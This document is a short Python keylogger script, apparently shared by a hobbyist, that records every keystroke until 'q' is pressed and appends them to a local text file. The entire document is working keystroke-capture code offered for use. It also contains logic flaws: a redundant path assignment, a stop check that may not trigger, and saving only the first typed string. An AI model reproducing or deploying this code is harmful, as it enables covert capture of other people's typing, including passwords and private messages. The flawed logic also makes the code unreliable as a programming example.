#This is a simple python keylogger that was made by Sud0.Me

# This is used for recording keystrokes
import keyboard
# This is used for the quit function to give the script time to save the keystrokes before closing
import time
# This is used to save the keystrokes to a file
import os

# Define your save path here
path = "WHERE YOU WANT TO SAVE THE FILE WITH THE KEYSTROKES"

# Saves to a file in the same dir as the script
path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "Keylogs.txt")

# Main loop were keystokes are logged
while True:
    print("Keylogger started. Press q to stop logging.")
    events = keyboard.record(until='q')
    keystrokes = list(keyboard.get_typed_strings(events))

# Save keystrokes to file when q is pressed
    if keyboard.is_pressed("q"):
        print("Keylogger stopped.")
        with open(path, 'a') as data_file:
            data_file.write("\n")
            data_file.write(keystrokes[0])
        print(f"Keystrokes saved to: {path}")
        time.sleep(2)
        break